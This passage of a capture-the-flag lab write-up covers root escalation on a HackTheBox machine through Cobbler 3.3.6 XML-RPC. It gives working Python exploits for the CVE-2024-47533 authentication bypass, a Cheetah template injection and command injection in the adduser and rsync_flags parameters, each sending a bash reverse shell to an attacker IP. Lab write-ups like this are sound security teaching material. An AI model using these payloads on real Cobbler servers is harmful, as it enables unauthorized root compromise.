└─$ curl -s -X POST http://127.0.0.1:25151/ -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>extended_version</methodName><params></params></methodCall>' | xmllint --xpath "//member[name='version']/value/string/text() | //member[name='builddate']/value/string/text()" -
Mon Sep 30 10:40:50 2024
3.3.6
```

Or use python xmlrpc library for ease, Read the cobbler [xmlrpc wiki](https://github.com/cobbler/cobbler/wiki/XMLRPC-API).

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3 -c "import xmlrpc.client; print(xmlrpc.client.Server('http://127.0.0.1:25151/').extended_version())"     
{'gitdate': '?', 'gitstamp': '?', 'builddate': 'Mon Sep 30 10:40:50 2024', 'version': '3.3.6', 'version_tuple': [3, 3, 6]}
```

We can call these RPC methods to get more data print `sget_distros()`, `get_profiles()`, `get_systems()`, `get_images()`, `get_repos()`.

I found only a minecraft image 1.21.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3 -c "import xmlrpc.client; print(xmlrpc.client.Server('http://127.0.0.1:25151/').get_images())" 
```

```json
[{'parent': '', 'depth': 0, 'ctime': 1727697786.151345, 'mtime': 1727697786.151345, 'uid': '6128813534084d4684d446648f035f4a', 'name': 'minecraft.1.21', 'comment': '', 'kernel_options': {}, 'kernel_options_post': {}, 'autoinstall_meta': {}, 'fetchable_files': {}, 'boot_files': {}, 'template_files': {}, 'owners': '<<inherit>>', 'mgmt_classes': '<<inherit>>', 'mgmt_parameters': {}, 'is_subobject': False, 'arch': 'x86_64', 'autoinstall': '<<inherit>>', 'breed': '', 'file': '', 'image_type': 'direct', 'network_count': 0, 'os_version': '', 'boot_loaders': [], 'menu': '', 'virt_auto_boot': False, 'virt_bridge': '<<inherit>>', 'virt_cpus': 1, 'virt_disk_driver': 'raw', 'virt_file_size': '<<inherit>>', 'virt_path': '', 'virt_ram': '<<inherit>>', 'virt_type': '<<inherit>>', 'kickstart': '<<inherit>>', 'ks_meta': {}}]
```

---

## 4. Privilege Escalation to Root

### 4.1 Cobbler Authentication Bypass (CVE-2024-47533)

Searching online I found that cobbler 3.3.6 is vulnerable to CVE-2024-47533, a unauthenticated Remote Code execution.

<img src="assets/img/cobblestone/cobbler_cve.png" alt="error loading image">

Cobbler, a Linux installation server that allows for rapid setup of network installation environments, has an improper authentication vulnerability starting in version 3.0.0 and prior to versions 3.2.3 and 3.3.7. `utils.get_shared_secret()` always returns `-1`, which allows anyone to connect to cobbler XML-RPC as user `''` password `-1` and make any changes. This gives anyone with network access to a cobbler server full control of the server.

We can get authentication token with username `''` and password `-1`.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3 -c "import xmlrpc.client; conn = xmlrpc.client.Server('http://127.0.0.1:25151/'); print(conn.login('', -1))"
8zFHjupqIflcZKdJPwu3K2Pg2YuCNjYKdg==
```

### 4.2 Cobbler RCE (Cheetah SSTI)

I'm going to reach Cobbler's template renderer, which processes autoinstall files through Cheetah, which evaluates arbitrary Python. The Cheetah renderer is not exposed as a standalone "render this file" service. It only runs when Cobbler generates a configuration file for a real object in its database, and the template it picks comes from that object's autoinstall field. That means we need to create objects whose autoinstall points at our malicious template, and then ask Cobbler to generate an autoinstall file for one of them. To get our template rendered, we first create an object whose autoinstall points at `exploit.ks` (cheetah payload), then trigger generation for that object. 

The autoinstall (template-path) field lives on profile and system objects only. Since `generate_autoinstall_for_profile` reads `profile.autoinstall`, the profile is the minimum object that can carry our exploit.ks template. Cobbler renders autoinstall (kickstart) templates server-side using the Cheetah templating engine (`templar.py:155 render_cheetah`). By default it restricts template imports to a whitelist defined in [settings.yaml](https://github.com/cobbler/cobbler/blob/v3.3.6/config/cobbler/settings.yaml#L154)

```yml
# settings.yaml Line 154
cheetah_import_whitelist:
 - "random"
 - "re"
 - "time"
 - "netaddr"
```

However, the guard that enforces it only inspects lines containing the literal Cheetah `#import` / `#from` directives. If a line dont contains `#import` / `#from` directives, then tne app dont check the above whitelist

```python
# templar.py Line 61-74
def check_for_invalid_imports(self, data: str):
      
    lines = data.split("\n")
    for line in lines:
        if "#import" in line or "#from" in line:
            rest = line.replace("#import", "").replace("#from", "").replace("import", ".").replace(" ", "").strip()
            if self.settings and rest not in self.settings.cheetah_import_whitelist:
                raise CX(f"Potentially insecure import in template: {rest}")
```

A `#set` line is never checked, and Cheetah still resolves Python builtins (`__import__`) at compile/execution time. So the entire guard is bypassed with:

```html
#set $x = $__import__("os").popen("COMMAND").read()
$x
```

First we plant the malicious template on the server using the API's own template-writing function. This writes our payload to `/var/lib/cobbler/templates/exploit.ks`.

```python
import xmlrpc.client
conn = xmlrpc.client.Server('http://127.0.0.1:25151/')
token = conn.login('', -1)

payload = '#set $x = $__import__("os").popen("bash -c \'bash -i >& /dev/tcp/10.10.15.119/4444 0>&1\'")\n$x'
conn.write_autoinstall_template("exploit.ks", payload, token)
```

Next we create a distro. This is boilerplate, but it is required because a profile (which is what carries the autoinstall reference) cannot exist without a parent distro. There are two small gotchas.

Cobbler validates the kernel and initrd values before it will accept them. The kernel and initrd fields must point at real files. The file must exist — `find_kernel` (`utils.py:385`) returns nothing unless `os.path.isfile(path)` is true. The filename must match a fixed regex `(vmlinu[xz] | (kernel|linux(\.img)?) | pxeboot\.n12 | wimboot | mboot\.c32 | .+\.kernel)` (`_re_kernel` in `utils.py:76`) — it checks the basename, not the full path. So a kernel filename may be `vmlinuz` or `vmlinux` or `kernel`, `linux`, `linux.img` or bootloader files like `pxeboot.n12`, `wimboot`, `mboot.c32` or anything ending in `.kernel`. The initrd has its own pattern `(initrd(.*)\.img | ramdisk\.image\.gz | boot\.sdi | imgpayld\.tgz)` (`_re_initrd` in `utils.py:77`). So an initrd filename must be `initrd.img`, `ramdisk.image.gz`, `boot.sdi`, or `imgpayld.tgz`.

```python
distro = conn.new_distro(token)
conn.modify_distro(distro, "name", "exploit-distro", token)
conn.modify_distro(distro, "kernel", "/vmlinuz", token)
conn.modify_distro(distro, "initrd", "/initrd.img", token)
conn.save_distro(distro, token)
```

A distro does not itself have an autoinstall field (only `autoinstall_meta`, a dictionary of extra variables), which is another reason the profile step is unavoidable.

Now we create a profile named `exploit`, attach it to our distro `exploit-distro`, and crucially set its autoinstall field to our malicious template file `exploit.ks`.

```python
profile = conn.new_profile(token)
conn.modify_profile(profile, "name", "exploit", token)
conn.modify_profile(profile, "distro", "exploit-distro", token)
conn.modify_profile(profile, "autoinstall", "exploit.ks", token)
conn.save_profile(profile, token)
```

With everything in place, we ask Cobbler to generate the autoinstall file for our profile:

```python
conn.generate_autoinstall("exploit")
```

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3                    
Python 3.13.14 (main, Jun 10 2026, 18:10:12) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import xmlrpc.client
>>> conn = xmlrpc.client.Server('http://127.0.0.1:25151/')
>>> token = conn.login('', -1)
>>> payload = '#set $x = $__import__("os").popen("bash -c \'bash -i >& /dev/tcp/10.10.15.119/4444 0>&1\'")\n$x'
>>> conn.write_autoinstall_template("exploit.ks", payload, token)
True                                                                                                                             
>>> conn.modify_distro(distro, "name", "exploit-distro", token)
True
>>> conn.modify_distro(distro, "kernel", "/vmlinuz", token)
True
>>> conn.modify_distro(distro, "initrd", "/initrd.img", token)
True
>>> conn.save_distro(distro, token)
True
>>> profile = conn.new_profile(token)
>>> conn.modify_profile(profile, "name", "exploit", token)
True
>>> conn.modify_profile(profile, "distro", "exploit-distro", token)
True
>>> conn.modify_profile(profile, "autoinstall", "exploit.ks", token)
True
>>> conn.save_profile(profile, token)
True
>>> conn.generate_autoinstall("exploit")
'<os._wrap_close object at 0x7f2cbc21ef10>'
```

We got a shell as root.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ penelope -i tun0 -S -p 4444
[+] Listening for reverse shells on 10.10.15.119:4444 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => cobblestone 10.129.232.170 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Stopping TCPListener(10.10.15.119:4444) due to Single Session mode
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/cobblestone~10.129.232.170-Linux-x86_64/2026_08_16-18_02_32-744-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@cobblestone:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Unintended RCE via XML-RPC Command Injection

Unintended path: I found this [issue](https://github.com/cobbler/cobbler/issues/1329) on cobbler github, which says A shell command injection vulnerability in several Cobbler XML-RPC API functions—such as the `rsync_flags` parameter in `background_import()` and the `adduser` option in `background_aclsetup()`—allows authorized users to execute arbitrary commands.

I will show how to abuse both functions. First abuse the `background_aclsetup()` function. The `background_aclsetup()` function in [remote.py](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/remote.py#L131-L148) passes the parameters e.g `adduser`, `addgroup`, `removeuser` and `removegroup` to `acl_config()` in [api.py](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/api.py#L1701).

```shell
def background_aclsetup(self, options: dict, token: str) -> str:

    def runner(self):
        self.remote.api.acl_config(
            self.options.get("adduser", None),
            self.options.get("addgroup", None),
            self.options.get("removeuser", None),
            self.options.get("removegroup", None),
        )

    return self.__start_task(runner, token, "aclsetup", "(CLI) ACL Configuration", options)
```

The `acl_config()` function create an AclConfig class object which is defined in [acl.py](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/actions/acl.py#L31) and calls the [run()](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/actions/acl.py#L42) function on the object passing the user supplied parameters.

```python
def acl_config(self, adduser: Optional[str] = None, addgroup: Optional[str] = None,
                removeuser: Optional[str] = None, removegroup: Optional[str] = None):
    
    action_acl = acl.AclConfig(self)
    action_acl.run(
        adduser=adduser,
        addgroup=addgroup,
        removeuser=removeuser,
        removegroup=removegroup
    )
```

The `run()` function pass the parameter to [modfacl()](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/actions/acl.py#L70). The `run()` functions checks if `adduser` parameter is specified, if it is specified it then both arguments `isadd` and `isuser` are set to true and then a cmd string is created. This cmd string are actually a set of strings which are passed to `setfacl` shell command without sanitization.

```python
# acl.py Line 42-57
def run(self, adduser: Optional[str] = None, addgroup: Optional[str] = None, removeuser: Optional[str] = None, removegroup: Optional[str] = None):
  
    ok = False
    if adduser:
        ok = True
        self.modacl(True, True, adduser)

# acl.py Line 70-117
def modacl(self, isadd: bool, isuser: bool, who: str):

    snipdir = self.settings.autoinstall_snippets_dir
    tftpboot = self.settings.tftpboot_location

    PROCESS_DIRS = {
        "/var/log/cobbler": "rwx",
        "/var/log/cobbler/tasks": "rwx",
        "/var/lib/cobbler": "rwx",
        "/etc/cobbler": "rwx",
        tftpboot: "rwx",
        "/var/lib/cobbler/triggers": "rwx"
    }
    if not snipdir.startswith("/var/lib/cobbler/"):
        PROCESS_DIRS[snipdir] = "r"

    cmd = "-R"

    if isadd:
        cmd = "%s -m" % cmd
    else:
        cmd = "%s -x" % cmd

    if isuser:
        cmd = "%s u:%s" % (cmd, who)
    else:
        cmd = "%s g:%s" % (cmd, who)

    for d in PROCESS_DIRS:
        how = PROCESS_DIRS[d]
        if isadd:
            cmd2 = "%s:%s" % (cmd, how)
        else:
            cmd2 = cmd

        cmd2 = "%s %s" % (cmd2, d)
        rc = utils.subprocess_call("setfacl -d %s" % cmd2, shell=True)
        if not rc == 0:
            utils.die("command failed")
        rc = utils.subprocess_call("setfacl %s" % cmd2, shell=True)
        if not rc == 0:
            utils.die("command failed")
```

So I write the below exploit to send the reverse shell command in `adduser` parameter.

```python
import xmlrpc.client

conn = xmlrpc.client.Server("http://127.0.0.1:25151/")
token = conn.login("", -1)
print("TOKEN:", token)
payload = "x; bash -c 'bash -i >& /dev/tcp/10.10.15.119/4444 0>&1'; #"
opts = {"adduser": payload}
print("EVENT:", conn.background_aclsetup(opts, token))
```

Setup the listener and run the exploit, we got shell as root.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3 cobbler_rce.py 
TOKEN: IfVj1tuJBgY/s4O7j8T3NEayGRYt7iXJ1Q==
EVENT: 2026-08-15_053711_(CLI) ACL Configuration_af59c65ba8a24c95aa29830e99a22ab7   
```

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ penelope -i tun0 -S -p 4444
[+] Listening for reverse shells on 10.10.15.119:4444 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => cobblestone 10.129.232.170 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Stopping TCPListener(10.10.15.119:4444) due to Single Session mode
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/cobblestone~10.129.232.170-Linux-x86_64/2026_08_16-15_33_38-115-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@cobblestone:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Now abusing the the `background_import()` function. The `background_import()` function in [remote.py](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/remote.py#L242-L263) passes the parameters e.g `name`, `path`, `rsync_flags` to `import_tree()` in [api.py](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/api.py#L1701). Remember the `name` and `path` are mandatory arguments of `background_import()`. I removed the comments from below code:

```python
# remote.py Line 242-263
def background_import(self, options: dict, token: str) -> str:

    def runner(self):
        self.remote.api.import_tree(
            self.options.get("path", None),
            self.options.get("name", None),
            self.options.get("available_as", None),
            self.options.get("autoinstall_file", None),
            self.options.get("rsync_flags", None),
            self.options.get("arch", None),
            self.options.get("breed", None),
            self.options.get("os_version", None),
        )

return self.__start_task(runner, token, "import", "Media import", options)

# api.py line 1701-1726
def import_tree(self, mirror_url: str, mirror_name: str, network_root=None, autoinstall_file=None, rsync_flags=None, arch=None, breed=None, os_version=None) -> bool:
        
    self.log("import_tree", [mirror_url, mirror_name, network_root, autoinstall_file, rsync_flags])

    # Both --path and --name are required arguments.
    if mirror_url is None or not mirror_url:
        self.log("import failed.  no --path specified")
        return False
    if mirror_name is None or not mirror_name:
        self.log("import failed.  no --name specified")
        return False
    ......
    ......
    ......    
```

In the same `import_tree()` at [Line 1759-1769](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/api.py#L1759-L1769), the app appends the `rsync_flags` directly to rsync command without sanitization and then calls the command through [utils.run_this()](https://github.com/cobbler/cobbler/blob/v3.3.6/cobbler/utils.py#L961-L972).

```python
# api.py Line 45
RSYNC_CMD = "rsync -a %s '%s' %s --progress"

# api.py Line 1759-1769
rsync_cmd = RSYNC_CMD
if rsync_flags:
    rsync_cmd += " " + rsync_flags

# If --available-as was specified, limit the files we pull down via rsync to just those that are critical
# to detecting what the distro is
if network_root is not None:
    rsync_cmd += " --include-from=/etc/cobbler/import_rsync_whitelist"

# kick off the rsync now
utils.run_this(rsync_cmd, (spacer, mirror_url, path))s
```

The `utils.run_this()` passes the rsync command to `subprocess_call` with `Shell=True`.

```python
def run_this(cmd: str, args: Union[str, tuple]):

    my_cmd = cmd % args
    rc = subprocess_call(my_cmd, shell=True)
    if rc != 0:
        die("Command failed")
```

So I developed the exploit script to send reverse shell in `rsync_flags` parameter.

```python
import xmlrpc.client

conn = xmlrpc.client.Server("http://127.0.0.1:25151/")
token = conn.login("", -1)
print("TOKEN:", token)
payload = "; bash -c 'bash -i >& /dev/tcp/10.10.15.119/4444 0>&1'; #"
opts = {"path": "rsync://127.0.0.1", "name": "x", "rsync_flags": payload}
print("EVENT:", conn.background_import(opts, token))
```

Setup a listener and run the above exploit we got shell as root.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ python3 cobbler_rce.py 
TOKEN: uAPXhJ/5UOJgTpxlnky/TpJR6JKB8jd7CA==
EVENT: 2026-08-15_053126_Media import_df700ed6dd42410488d745ba95635850 
```

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ penelope -i tun0 -S -p 4444
[+] Listening for reverse shells on 10.10.15.119:4444 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => cobblestone 10.129.232.170 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Stopping TCPListener(10.10.15.119:4444) due to Single Session mode
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/cobblestone~10.129.232.170-Linux-x86_64/2026_08_16-15_33_38-115-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@cobblestone:/# id
uid=0(root) gid=0(root) groups=0(root)
```


## Mitigations

**Parameterize Database Queries:** Ensure all database interactions utilize prepared statements and parameterized queries to prevent SQL injection vulnerabilities within the URL suggestion feature.

**Sanitize User Input:** Implement strict output encoding and input validation for all user-submitted data. Utilize Twig's auto-escaping features and remove the `raw` filter when rendering user input to prevent Cross-Site Scripting (XSS).

**Restrict Template Contexts:** Prevent user input from being evaluated dynamically as template code within the preview functionality to mitigate Server-Side Template Injection (SSTI). Ensure templates are strictly separated from data.

**Harden Administrative Interfaces:** Ensure administrative endpoints do not expose sensitive configuration details, such as the output of `phpinfo()`, which can be leveraged to bypass security controls like `HttpOnly` cookies.

**Update Internal Services:** Upgrade the internal Cobbler service to a patched version to resolve known authentication bypass and remote code execution vulnerabilities in the XML-RPC API.
